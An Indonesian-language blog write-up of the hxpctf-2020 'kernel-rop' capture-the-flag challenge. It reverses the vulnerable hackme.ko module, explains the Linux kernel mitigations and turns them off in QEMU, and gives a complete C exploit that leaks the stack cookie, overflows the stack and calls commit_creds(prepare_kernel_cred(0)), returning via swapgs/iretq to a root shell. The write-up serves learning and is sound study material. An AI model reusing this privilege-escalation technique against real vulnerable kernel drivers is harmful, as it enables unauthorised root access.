---
title: "Linux Kernel PWN: hxpctf-2020 kernel-rop"
date: 2024-08-06 00:00:00 + 0800
tags: [pwn]
categories: [linux-kernel-pwn]
---
Introduction
---
Exploitasi kernel linux, ketika saya pertama kali mendengar tentang topik itu. saya yakin itu adalah topik yang sulit dan menyeramkan untuk dipelajari tapi, banyak peneliti profesional diluar sana yang sudah mendokumentasikan hasil penemuan  dan POC mereka dengan detail teknis yang jelas. tapi tetap saja, diperlukan basis pengetahuan sampai level tertentu bagi pemula seperti saya untuk memahami tulisan mereka. bahkan jika anda siap untuk mengeluarkan uang, ada beberapa kursus yang spesifik untuk eksploitasi kernel linux dan android yang tentunya sangat mahal seperti yang ada di <a href="https://www.offensivecon.org/trainings/2024/exploiting-the-linux-kernel.html">link ini</a> , tentunya dipandu oleh peneliti yang sudah sangat berpengalaman dibidang tersebut. tapi bagi orang yang pas-pasan seperti saya, satu-satunya cara untuk mempelajari topik ini adalah dengan mencari sumber daya pembelajaran yang tersebar di internet. seperti tantangan kernel-ctf, yang salah satunya akan saya bahas kali ini. saya mendapatkan referensi dari <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/?ref=0x434b.dev"> blog ini </a> sebagai panduan pertama saya untuk belajar tentang eksploitasi kernel linux, dan jika anda ingin dari 0 seperti membangun lingkungan debugging, silahkan lihat blog yang bagus <a href="https://scoding.de/linux-kernel-exploitation-environment">ini</a>.
---

Menyiapkan lingkungan
---
saya sudah menyiapkan semua file yang dibutuhkan, mulai dari sistem berkas, file linux terkompresi seperti vmlinux dan bzimage <a href="https://2020.ctf.link/assets/files/kernel-rop-bf9c106d45917343.tar.xz"> disini </a>. 

decompress file system menggunakan script yang sudah ada disana.

script yang diperlukan untuk mengcompress dan mendecompress file system:

```
#!/bin/sh

mkdir initramfs
cd initramfs
cp ../initramfs.cpio.gz .
gunzip ./initramfs.cpio.gz
cpio -idm < ./initramfs.cpio
rm initramfs.cpio

```


```
#!/bin/sh
gcc -o fuzz  fuzz.c -static $1
mv ./fuzz ./initramfs
cd initramfs
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > initramfs_updated.cpio.gz
mv ./initramfs_updated.cpio.gz ../

```
untuk script yang digunakan untuk mengekstrak vmlinuz atau bzImage menjadi vmlinux, saya mendapatkannya <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/extract-image.sh">disini</a>
ekstrak gadget untuk ROP menggunakan tools seperti ROPgadget atau ropper

```
Bash
ROPgadget --binary vmlinux > gadget.txt
```
---

Reversing
---
tidak ada file sumber yang disediakan dalam tantangan, yang artinya kita harus membongkar module kernel yang rentan tersebut, hackme.ko adalah module yang akan kita eksploitasi kali ini, ketika saya menggunakan radare2. ada beberapa fungsi yang ada didalam module tersebut.

```
0x08000070    1     13 sym.hackme_release
0x08000080    8    174 sym.hackme_write
0x08000140    1     13 sym.hackme_open
0x08000150    5    174 sym.hackme_read
0x08000207    1     23 sym.hackme_init
0x0800021e    1     18 sym.hackme_exit
```

jadi, ayo lihat apa yang ada didalam fungsi hackme_write dan hackme_read

```
r2 -w hackme.ko
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
 -- Almost 5am, maybe you should go to bed.
[0x08000064]> aaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze symbols (af@@@s)
INFO: Recovering variables
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods
INFO: Recovering local variables (afva)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x08000064]> afl
0x08000070    1     13 sym.hackme_release
0x08000080    8    174 sym.hackme_write
0x08000140    1     13 sym.hackme_open
0x08000150    5    174 sym.hackme_read
0x08000207    1     23 sym.hackme_init
0x0800021e    1     18 sym.hackme_exit
[0x08000064]> s sym.hackme_write
[0x08000080]> pdf

```

```
hackme_write
sym.hackme_write ();
│           ; var int64_t var_18h @ rbp-0x18
│           ; var int64_t var_98h @ rbp-0x98
│           0x08000080      e800000000     call __fentry__             ; RELOC 32 __fentry__ ; [05] -r-x section size 183 named .text.hackme_write
│           ; CALL XREF from sym.hackme_write @ 0x8000080(x)
│           0x08000085      55             push rbp
│           0x08000086      4889e5         mov rbp, rsp
│           0x08000089      4154           push r12
│           0x0800008b      53             push rbx
│           0x0800008c      4889d3         mov rbx, rdx
│           0x0800008f      4881ec8800..   sub rsp, 0x88
│           0x08000096      65488b0425..   mov rax, qword gs:[0x28]
│           0x0800009f      488945e8       mov qword [var_18h], rax
│           0x080000a3      31c0           xor eax, eax
│           0x080000a5      4881fa0010..   cmp rdx, 0x1000
│       ┌─< 0x080000ac      775f           ja 0x800010d
│       │   0x080000ae      31d2           xor edx, edx                ; hackme.c:30
│       │   0x080000b0      4989f4         mov r12, rsi
│       │   0x080000b3      48c7c70000..   mov rdi, 0                  ; RELOC 32 hackme_buf @ 0x08000900
│       │   0x080000ba      4889de         mov rsi, rbx
│       │   0x080000bd      e800000000     call __check_object_size    ; RELOC 32 __check_object_size
│       │   ; CALL XREF from sym.hackme_write @ 0x80000bd(x)
│       │   0x080000c2      4889da         mov rdx, rbx
│       │   0x080000c5      4c89e6         mov rsi, r12
│       │   0x080000c8      48c7c70000..   mov rdi, 0                  ; RELOC 32 hackme_buf @ 0x08000900
│       │   0x080000cf      e800000000     call _copy_from_user        ; RELOC 32 _copy_from_user
│       │   ; CALL XREF from sym.hackme_write @ 0x80000cf(x)
│       │   0x080000d4      4885c0         test rax, rax
│      ┌──< 0x080000d7      7555           jne 0x800012e
│      ││   0x080000d9      488dbd68ff..   lea rdi, [var_98h]
│      ││   0x080000e0      4889da         mov rdx, rbx
│      ││   0x080000e3      48c7c60000..   mov rsi, 0                  ; RELOC 32 hackme_buf @ 0x08000900
│      ││   0x080000ea      e800000000     call __memcpy               ; RELOC 32 __memcpy
│      ││   ; CALL XREF from sym.hackme_write @ 0x80000ea(x)
│      ││   0x080000ef      4889d8         mov rax, rbx
│      ││   ; CODE XREF from sym.hackme_write @ 0x8000135(x)
│    ┌┌───> 0x080000f2      488b4de8       mov rcx, qword [var_18h]
│    ╎╎││   0x080000f6      6548330c25..   xor rcx, qword gs:[0x28]
│   ┌─────< 0x080000ff      7528           jne __stack_chk_fail
│   │╎╎││   0x08000101      4881c48800..   add rsp, 0x88
│   │╎╎││   0x08000108      5b             pop rbx
│   │╎╎││   0x08000109      415c           pop r12
│   │╎╎││   0x0800010b      5d             pop rbp
│   │╎╎││   0x0800010c      c3             ret
│   │╎╎││   ; CODE XREF from sym.hackme_write @ 0x80000ac(x)
│   │╎╎│└─> 0x0800010d      be00100000     mov esi, 0x1000
│   │╎╎│    0x08000112      48c7c70000..   mov rdi, 0                  ; RELOC 32 .rodata.str1.8 @ 0x08000258
│   │╎╎│    0x08000119      e800000000     call __warn_printk          ; RELOC 32 __warn_printk
│   │╎╎│    ; CALL XREF from sym.hackme_write @ 0x8000119(x)
│   │╎╎│    0x0800011e      0f0b           ud2
..
│   │ ╎│    ; CODE XREF from sym.hackme_write @ 0x80000ff(x)
│   └─────> 0x08000129      e800000000     call __stack_chk_fail       ; RELOC 32 __stack_chk_fail
│     ╎│    ; CALL XREFS from sym.hackme_write @ 0x80000d7(x), 0x8000129(x)
│     ╎└──> 0x0800012e      48c7c0f2ff..   mov rax, 0xfffffffffffffff2
└     └───< 0x08000135      ebbb           jmp 0x80000f2

```
ini adalah fungsi hackme_read
```
[0x08000080]> s sym.hackme_read
[0x08000150]> pdf

sym.hackme_read ();
│           ; var int64_t var_18h @ rbp-0x18
│           ; var int64_t var_98h @ rbp-0x98
│           0x08000150      e800000000     call __fentry__             ; RELOC 32 __fentry__ ; [09] -r-x section size 183 named .text.hackme_read
│           ; CALL XREF from sym.hackme_read @ 0x8000150(x)
│           0x08000155      55             push rbp
│           0x08000156      48c7c70000..   mov rdi, 0                  ; RELOC 32 hackme_buf @ 0x08000900
│           0x0800015d      4889e5         mov rbp, rsp
│           0x08000160      4154           push r12
│           0x08000162      53             push rbx
│           0x08000163      4989f4         mov r12, rsi
│           0x08000166      488db568ff..   lea rsi, [var_98h]
│           0x0800016d      4889d3         mov rbx, rdx
│           0x08000170      4881ec8800..   sub rsp, 0x88
│           0x08000177      65488b0425..   mov rax, qword gs:[0x28]
│           0x08000180      488945e8       mov qword [var_18h], rax
│           0x08000184      31c0           xor eax, eax
│           0x08000186      e800000000     call 0x800018b
│           ; CALL XREF from sym.hackme_read @ 0x8000186(x)
│           0x0800018b      4881fb0010..   cmp rbx, 0x1000
│       ┌─< 0x08000192      774f           ja 0x80001e3
│       │   0x08000194      ba01000000     mov edx, 1
│       │   0x08000199      4889de         mov rsi, rbx
│       │   0x0800019c      48c7c70000..   mov rdi, 0
│       │   0x080001a3      e800000000     call 0x80001a8
│       │   ; CALL XREF from sym.hackme_read @ 0x80001a3(x)
│       │   0x080001a8      4889da         mov rdx, rbx
│       │   0x080001ab      48c7c60000..   mov rsi, 0
│       │   0x080001b2      4c89e7         mov rdi, r12
│       │   0x080001b5      e800000000     call 0x80001ba
│       │   ; CALL XREF from sym.hackme_read @ 0x80001b5(x)
│       │   0x080001ba      4885c0         test rax, rax
│       │   0x080001bd      48c7c0f2ff..   mov rax, 0xfffffffffffffff2
│       │   0x080001c4      480f44c3       cmove rax, rbx
│      ┌──> 0x080001c8      488b4de8       mov rcx, qword [var_18h]
│      ╎│   0x080001cc      6548330c25..   xor rcx, qword gs:[0x28]
│     ┌───< 0x080001d5      752b           jne 0x8000202
│     │╎│   0x080001d7      4881c48800..   add rsp, 0x88
│     │╎│   0x080001de      5b             pop rbx
│     │╎│   0x080001df      415c           pop r12
│     │╎│   0x080001e1      5d             pop rbp
│     │╎│   0x080001e2      c3             ret
│     │╎│   ; CODE XREF from sym.hackme_read @ 0x8000192(x)
│     │╎└─> 0x080001e3      4889da         mov rdx, rbx
│     │╎    0x080001e6      be00100000     mov esi, 0x1000
│     │╎    0x080001eb      48c7c70000..   mov rdi, 0
│     │╎    0x080001f2      e800000000     call 0x80001f7
│     │╎    ; CALL XREF from sym.hackme_read @ 0x80001f2(x)
│     │╎    0x080001f7      0f0b           ud2
..
│     │     ; CODE XREF from sym.hackme_read @ 0x80001d5(x)
└     └───> 0x08000202      e800000000     call sym.hackme_init

```
kerentanan yang ada didalam kedua fungsi diatas sangat jelas, pengguna memungkinkan untuk mengirim dan menerima buffer sampai 0x1000(4090) byte, namun jika lebih dari itu, maka fungsi warn_printk akan dipanggil.

```
0x080000a5      4881fa0010   cmp rdx, 0x1000
0x080000ac      775f           ja 0x800010d
```

kita bisa mengabaikan intruksi yang memanggil fungsi __check_object_size karena itu tidak akan mempengaruhi apapun yang kita kirim atau terima selagi buffer yang kita masukkan atau terima tidak lebih dari 0x1000 byte..

dan pada baris ini didalam fungsi hackme_write, kernel menyalin dari ruang pengguna ke ruang kernel menggunakan fungsi copy_from_user, biasanya menggunakan ioctl atau write.

```
0x080000c2      4889da         mov rdx, rbx
0x080000c5      4c89e6         mov rsi, r12
0x080000c8      48c7c70000..   mov rdi, 0
0x080000cf      e800000000     call _copy_from_user
```
jangan lupa bahwa rsp dikurangi 0x88, sedangkan ukuran hackme_buff adalah 0x32. yang artinya kita bisa mengalahkan canary dengan cara membocorkan cookie dan menghitung alamat basis kernel.

```
RELOC 32 hackme_buf @ 0x08000900 //saya berasumsi bahwa ini adalah variable yang digunakan untuk menerima dan mengirim buffer saat copy_from user dan copy_to_user, lalu. apa selanjutnya?

```
---

Exploiting
---
kita sudah mengetahui kerentanan pada modul hackme.ko seperti apa, lalu bagaimana cara kita memanfaatkan kerentanan tersebut untuk meningkatkan hak istimewa menjad root? sebelum itu, kita akan mempelajari dulu tentang beberapa mitigasi umum yang harus kita ketahui

1. Kernel stack cookies (atau canaries): Ini sama persis dengan stack canaries di userland. Fitur ini diaktifkan di kernel saat kompilasi dan tidak dapat dinonaktifkan.

2. Kernel address space layout randomization (KASLR): Mirip dengan ASLR di userland, fitur ini mengacak alamat dasar tempat kernel dimuat setiap kali sistem di-boot. Fitur ini dapat diaktifkan atau dinonaktifkan dengan menambahkan opsi kaslr atau nokaslr di bawah opsi -append.

3. Supervisor mode execution protection (SMEP): Fitur ini menandai semua halaman userland dalam tabel halaman sebagai non-eksekutabel saat proses berada dalam mode kernel. Di kernel, fitur ini diaktifkan dengan mengatur bit ke-20 dari Control Register CR4. Saat boot, fitur ini dapat diaktifkan dengan menambahkan +smep ke -cpu, dan dinonaktifkan dengan menambahkan nosmep ke -append.

4. Supervisor Mode Access Prevention (SMAP): Melengkapi SMEP, fitur ini menandai semua halaman userland dalam tabel halaman sebagai tidak dapat diakses saat proses berada dalam mode kernel, yang berarti halaman tersebut tidak dapat dibaca atau ditulis juga. Di kernel, fitur ini diaktifkan dengan mengatur bit ke-21 dari Control Register CR4. Saat boot, fitur ini dapat diaktifkan dengan menambahkan +smap ke -cpu, dan dinonaktifkan dengan menambahkan nosmap ke -append.

5. Kernel page-table isolation (KPTI): Ketika fitur ini aktif, kernel memisahkan tabel halaman user-space dan kernel-space sepenuhnya, alih-alih menggunakan satu set tabel halaman yang mengandung alamat user-space dan kernel-space. Satu set tabel halaman mencakup alamat kernel-space dan user-space seperti sebelumnya, tetapi hanya digunakan saat sistem berjalan dalam mode kernel. Set tabel halaman kedua untuk digunakan dalam mode pengguna berisi salinan alamat user-space dan satu set minimal alamat kernel-space. Fitur ini dapat diaktifkan atau dinonaktifkan dengan menambahkan kpti=1 atau nopti di bawah opsi -append.

metode dasar untuk melakukan peningkatan hak istimewa di kernel linux adalah menggunakan commit_creds dan prepare_kernel_cred karena ini adalah cara yang sama seperti yang dilakukan kernel saat membuat proses dengan hak akses root. Hal penting lainnya yang harus dilakukan setelah mendapatkan hak akses root adalah kembali ke ruang pengguna. Karena kita sekarang mengeksploitasi modul kernel, konteksnya adalah kernel, tetapi pada akhirnya kita harus kembali ke ruang pengguna dan mengambil shell dengan hak akses root, jadi kita harus kembali ke ruang pengguna tanpa crash. Pertama, mari kita jelaskan bagian teoretis ini.

```
commit_creds(prepare_kernel_cred(0));
```

tapi sejak versi kernel 6.2, tidak lagi bisa meneruskan NULL kedalam prepare_kernel_cred, tapi masih bisa dengan cara meneruskan init_cred kedalam commit_creds

```
commit_creds(&init_cred);
```

tapi beruntung karena dalam tantangan kita kali ini, versi kernel yang digunakan adalah 5.9. jadi kita bisa menggunakan commit_creds(prepare_kernel_cred(0)).

baik, kita langsung saja praktekan. tapi sebelum itu kita akan menonaktifkan semua mitigasi seperti SMAP,SMEP,KPTI dan KASLR. buka script run.sh:

```
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smap,+smep \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"

```

kita ubah menjadi

```
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64 \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 nokaslr kpti=0 quiet panic=1"

```

jangan lupa berikan opsi s dan S untuk memungkinkan kita melakukan debugging pada vmlinux, lalu ubah file /initramfs/etc/inittab:

```
::sysinit:/etc/init.d/rcS
::once:-sh -c 'cat /etc/motd; setuidgid 1000 sh; poweroff'

```
menjadi 


```
::sysinit:/etc/init.d/rcS
::once:-sh -c 'cat /etc/motd; setuidgid 0 sh; poweroff'
```
untuk memberikan kita akses root saat debugging, ini penting untuk mencari address yang dibutuhkan seperti commit_creds dan lainnya. karena jika tidak dalam keadaan root, itu tidak akan memberikan kita address apapun yang kita ingin ketahui.

untuk langkah pertama, ayo kita bocorkan stack cookie terlebih dahulu

```
#define _GNU_SOURCE_
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>
#include<string.h>

#define DEV "/dev/hackme"

unsigned long user_ss, user_cs, user_rsp, user_rflags;
unsigned long kbase, cookie;
int fd;

void leak()
{
    unsigned long buff[50];
    read(fd,buff,sizeof(buff));

    for(int i=0; i< 50; i++){
        printf("%d: 0x%016lx\n" ,i, buff[i]);
    }
}

void open_dev()
{
    fd = open(DEV,O_RDWR);
    if(fd==-1){
        perror("open(fd)");
        exit(EXIT_FAILURE);
    }
}

int main()
{
    open_dev();

    leak();
    
    close(fd);
    return 0;
}

```
sebelum itu, kita harus mengedit file compress.sh. sesuaikan nama exploit.c kita:

```
#!/bin/sh
gcc -o exploit  exploit.c -static $1
mv ./exploit ./initramfs
cd initramfs
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > initramfs.cpio.gz
mv ./initramfs.cpio.gz ../

```

jalankan dengan cara:

```
./compress.sh
```

setelah itu qemu akan terbuka dan masuk kedalam lingkungan kernel yang berjalan pada busybox, kita cukup jalankan saja:

```
./exploit
```
offset cookie ada pada offset ke-16, sedangkan alamat basis kernel yang kita bocorkan ada pada offset ke-38

```
/ $ ./fuzz
0: 0xffff88800781f500
1: 0xffffc900001c7e40
2: 0x6beb49bb0d5a1800
3: 0xffff888006876310
4: 0xffffc900001c7e68
5: 0x0000000000000004
6: 0xffff888006876300
7: 0xffffc900001c7ef0
8: 0xffff888006876300
9: 0xffffc900001c7e80
10: 0xffffffff8184e047
11: 0xffffffff8184e047
12: 0xffff888006876300
13: 0x0000000000000000
14: 0x00007fffb0d15fc0
15: 0xffffc900001c7ea0
16: 0x6beb49bb0d5a1800
17: 0x0000000000000190
18: 0x0000000000000000
19: 0xffffc900001c7ed8
20: 0xffffffff816d51ff
21: 0xffff888006876300
22: 0xffff888006876300
23: 0x00007fffb0d15fc0
24: 0x0000000000000190
25: 0x0000000000000000
26: 0xffffc900001c7f20
27: 0xffffffff816d5727
28: 0xffffc900001c7f08
29: 0x0000000000000000
30: 0x6beb49bb0d5a1800
31: 0xffffc900001c7f58
32: 0x0000000000000000
33: 0x0000000000000000
34: 0x0000000000000000
35: 0xffffc900001c7f30
36: 0xffffffff816d577a
37: 0xffffc900001c7f48
38: 0xffffffff8100a157
39: 0x0000000000000000
40: 0x0000000000000000
41: 0xffffffff8120008c
42: 0x0000000000000001
43: 0x00000000004ad868
44: 0x00007fffb0d16298
45: 0x00007fffb0d16288
46: 0x00007fffb0d16160
47: 0x0000000000000001
48: 0x0000000000000246
49: 0x0000000000000000


```
simplenya semperti ini 0xffffffff8100a157 - 0xa157 = 0xffffffff81000000 (kernel base) karena Pengacakan alamat kernel dilakukan pada tingkat tabel halaman dan diimplementasikan dengan fungsi kaslr.c. Kernel mencadangkan 1GB ruang alamat dari 0xffffffff80000000 hingga 0xffffffffc0000000. Oleh karena itu, meskipun KASLR diaktifkan, hanya alamat dasar 0x3f0 dari 0x810 hingga 0xc00 yang dihasilkan.kernel_randomize_memory. dan fungsi kernel ini sebenarnya mengeluarkan 3 register dari stack, yaitu rbx, r12, rbp dan bukan hanya rbp. Oleh karena itu, kita harus meletakkan 3 nilai sampah setelah cookie. Kemudian nilai berikutnya akan menjadi alamat pengembalian yang kita inginkan agar program kita kembali, yang merupakan fungsi yang akan kita buat untuk userland mencapai hak akses root.

selanjutnya, kita harus mengetahui offset commit_creds dan prepare_kernel_creds didalam qemu, jalankan ./run.sh dan ini ketikkan ini: 

```
cat /proc/kallsyms | grep commit_creds
ffffffff814c6410 T commit_creds

cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff814c67f0 T prepare_kernel_cred
```

Dalam kondisi eksploitasi saat ini, jika Anda hanya kembali ke userland dengan kode untuk membuka shell, Anda akan kecewa. Alasannya adalah karena setelah menjalankan kode tersebut, kita masih berada dalam mode kernel. Untuk membuka shell root, kita harus kembali ke mode pengguna.

Biasanya, kernel akan kembali ke userland menggunakan salah satu dari instruksi berikut (dalam x86_64): sysretq atau iretq. Cara yang umum digunakan adalah melalui iretq, karena sysretq lebih rumit untuk dilakukan dengan benar. Instruksi iretq hanya membutuhkan tumpukan disiapkan dengan 5 nilai register userland dalam urutan ini: RIP|CS|RFLAGS|SP|SS.

Proses melacak dua set nilai berbeda untuk register-register ini, satu untuk mode pengguna dan satu untuk mode kernel. Oleh karena itu, setelah selesai mengeksekusi dalam mode kernel, proses harus kembali ke nilai-nilai register mode pengguna. Untuk RIP, kita cukup mengatur ini ke alamat fungsi yang memunculkan shell. Namun, untuk register-register lainnya, jika kita hanya mengaturnya ke nilai acak, proses mungkin tidak melanjutkan eksekusi seperti yang diharapkan. Untuk mengatasi masalah ini, orang-orang telah menemukan cara pintar: simpan status register-register ini sebelum masuk ke mode kernel, lalu muat ulang setelah memperoleh hak akses root. Fungsi untuk menyimpan statusnya adalah sebagai berikut::

```
void save_state()
{
	__asm__ volatile(
	 ".intel_syntax noprefix;"
	 "mov user_cs, cs;"
	 "mov user_ss, ss;"
	 "mov user_rsp, rsp;"
	 "pushf;"
	 "pop user_rflags;"
	 ".att_syntax;"
	);
	printf("menyimpan status userland\n");
}

```
Dan satu hal lagi, pada x86_64, satu instruksi lagi yang disebut swapgsharus dipanggil sebelum iretq. Tujuan dari instruksi ini adalah untuk menukar GS register antara kernel-modedan user-mode. Dengan semua informasi tersebut, kita dapat menyelesaikan kode untuk mendapatkan hak akses root, lalu kembali ke user-mode:

```
unsigned long user_rip = (unsigned long)get_shell;

void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff814c6410;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_rsp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

```
ketika saya menjalankan kembali exploitnya

```
/ $ ./fuzz
[*] Saved state
[*] payload
ROOOT
/ # id
uid=0 gid=0
/ # exit
/ $ exit
The system is going down NOW!
Sent SIGTERM to all processes
Sent SIGKILL to all processes
Requesting system poweroff
[   69.619339] reboot: Power down
```

ini kode lengkapnya

```
#define _GNU_SOURCE_
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>
#include<string.h>

#define DEV "/dev/hackme"

unsigned long user_ss, user_cs, user_rsp, user_rflags;
unsigned long kbase, cookie;
int fd;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void shell()
{
    const char *argv[] = {"/bin/sh",NULL};
    const char *envp[] = {NULL};
    puts("ROOOT");
    execve("/bin/sh",argv,envp);
}
unsigned long user_rip = (unsigned long)shell;

void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff814c6410;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_rsp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

void leak()
{
    unsigned long buff[50];
    read(fd,buff,sizeof(buff));

    /*for(int i=0; i< 50; i++){
        printf("%d: 0x%016lx\n" ,i, buff[i]);
    }*/
    cookie = buff[16];
    kbase = buff[38] - 0xa157; //0xffffffff8100a157 - 0xa157 = 0xffffffff81000000
}

void open_dev()
{
    fd = open(DEV,O_RDWR);
    if(fd==-1){
        perror("open(fd)");
        exit(EXIT_FAILURE);
    }
}

int main()
{
    save_state();
    open_dev();

    leak();

    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = (unsigned long)escalate_privs; // ret

    puts("[*] payload");
    write(fd, payload, sizeof(payload));
  
    close(fd);
    return 0;
}

```

Kesimpulan
---
pada tantangan kali ini, tentu saya hanya membahas bagian yang paling dasar, tanpa mengaktifkan satupun mitigasi seperti KASLR, SMEP, SMAP, KPTI. walaupun sebenarnya banyak mitigasi lain di kernel linux modern saat ini, seperti pengacakan daftar bebas, pengerasan daftar bebas,pengacakan cache kmalloc, pengerasan usercopy, KCFI dan lainnya. dikesempatan selanjutnya, saya akan menulis namun dengan tantangan lain dan juga belajar untuk melewati mitigasi satu persatu dan mungkin akan membahas topik yang lebih kompleks seperti teknik cross cache dan dirty page table. jika ada yang salah dari apa yang saya sampaikan ataupun ingin bertanya tentang tantangan kali ini, jangan sungkan untuk mengirim email, terima kasih.  
---

Referensi
---
<a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</a>

<a href="https://y3a.github.io/2021/06/11/hxpctf-kernelrop/">https://y3a.github.io/2021/06/11/hxpctf-kernelrop/</a>

<a href="http://www.phrack.org/issues/49/14.html#article">http://www.phrack.org/issues/49/14.html#article</a>

<a href="https://lwn.net/Articles/569635/">https://lwn.net/Articles/569635/</a>

<a href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf">https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf</a>

<a href="https://lwn.net/Articles/517475/">https://lwn.net/Articles/517475/</a>

<a href="https://lwn.net/Articles/741878/">https://lwn.net/Articles/741878/</a>

---

---